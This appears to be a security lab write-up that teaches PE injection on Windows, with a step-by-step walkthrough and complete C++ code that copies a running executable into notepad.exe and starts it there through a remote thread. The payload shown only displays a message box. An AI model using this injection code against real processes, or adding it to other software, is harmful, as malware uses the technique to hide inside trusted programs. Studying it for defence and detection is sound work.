---
description: Code Injection
---

# PE Injection: Executing PEs inside Remote Processes

This is a quick lab of a simplified way of injecting an entire portable executabe \(PE\) into another running process.

{% hint style="warning" %}
Note that in order to inject more complex PEs, additional DLLs in the target process may need to be loaded and Import Address Table fixed and for this, refer to my other lab [Reflective DLL Injection](reflective-dll-injection.md#resolving-import-address-table).
{% endhint %}

## Overview

In this lab, I wrote a simple C++ executable that self-injects its PE into a target process. This executable contains 2 functions:

* `main` - this is the function that performs the self-injection of the PE image into a specified remote/target process, which is going to be `notepad.exe` in this case;
* `InjectionEntryPoint` - this is the function that will get executed by the target process \(notepad\) once notepads gets injected with our PE. 
  * This function will pop a `MessageBox` with a name of the module the code is currently running from. If injection is successful, it should spit out a path of notepad.exe.

## Technique Overview

Inside the current process, that's doing the self-injection of its PE:

1. Get the image base address `imageBase`
2. Parse the PE headers and get its `sizeOfImage`
3. Allocate a block of memory \(size of PE image retrieved in step 1\). Let's call it `localImage`
4. Copy the image of the current process into the newly allocated local memory `localImage`
5. Allocate a new memory block \(size of PE image retrieved in step 1\) in a remote process - the target process we want to inject the currently running PE into. Let's call it `targetImage`
6. Calculate the delta between memory addresses `targetImage` and `imageBase`, let's call it `deltaImageBase` 
7. Relocate/rebase the PE that's stored in `localImage` to `targetImage`. For more information about image relocations, see my other lab [T1093: Process Hollowing and Portable Executable Relocations](process-hollowing-and-pe-image-relocations.md)
8. Write the patched PE into the `targetImage` memory location using `WriteProcessMemory`
9. Create remote thread and point it to `InjectionEntryPoint` function inside the PE target process

## Walkthrough

Getting `sizeOfImage` of the current process \(local process\) that will be injecting itself into a target process and allocating a new memory block in the local process:

![](../../.gitbook/assets/image%20%28140%29.png)

In my case, the new memory block got allocated at address `0x000001813acc0000`. Let's copy the current process's image in there:

![](../../.gitbook/assets/image%20%28280%29.png)

Let's allocate a new block of memory in the target process. In my case it got allocated at `0x000001bfc0c20000`:

![](../../.gitbook/assets/image%20%28214%29.png)

Calculate the delta between `0x000001bfc0c20000` and `0x000001813acc0000` and perform [image base relocations](process-hollowing-and-pe-image-relocations.md#relocation). Once that's done, we can move over our rebased PE from `0x000001813acc0000` to `0x000001bfc0c20000` in the remote process using `WriteProcessMemory`. 

Below shows that our imaged has now been moved to the remote process:

![](../../.gitbook/assets/image%20%2891%29.png)

Finally, we can create a remote thread and point it to the `InjectionEntryPoint` function inside the remote process:

```cpp
CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);
```

![New thread getting created inside notepad.exe](../../.gitbook/assets/newthread.gif)

## Demo

Below shows how we've injected the PE into the notepad \(PID 11068\) and executed its function `InjectionEntryPoint` which printed out the name of a module the code was running from, proving that the PE injection was succesful:

![](../../.gitbook/assets/pe-injection.gif)

## Code

Below is the commented code that performs the PE injection:

```cpp
#include <stdio.h>
#include <Windows.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

DWORD InjectionEntryPoint()
{
	CHAR moduleName[128] = "";
	GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));
	MessageBoxA(NULL, moduleName, "Obligatory PE Injection", NULL);
	return 0;
}

int main()
{
	// Get current image's base address
	PVOID imageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

	// Allocate a new memory block and copy the current PE image to this new memory block
	PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

	// Open the target process - this is process we will be injecting this PE into
	HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, 9304);
	
	// Allote a new memory block in the target process. This is where we will be injecting this PE
	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently
	DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

	// Relocate localImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD relocationEntriesCount = 0;
	PDWORD_PTR patchedAddress;
	PBASE_RELOCATION_ENTRY relocationRVA = NULL;

	while (relocationTable->SizeOfBlock > 0)
	{
		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

		for (short i = 0; i < relocationEntriesCount; i++)
		{
			if (relocationRVA[i].Offset)
			{
				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
				*patchedAddress += deltaImageBase;
			}
		}
		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
	}

	// Write the relocated localImage into the target process
	WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL);

	// Start the injected PE inside the target process
	CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase), NULL, 0, NULL);

	return 0;
}
```

## References

{% embed url="https://www.andreafortuna.org/2018/09/24/some-thoughts-about-pe-injection/" %}

{% embed url="https://blog.sevagas.com/PE-injection-explained" %}

{% embed url="https://www.malwaretech.com/2013/11/portable-executable-injection-for.html" %}

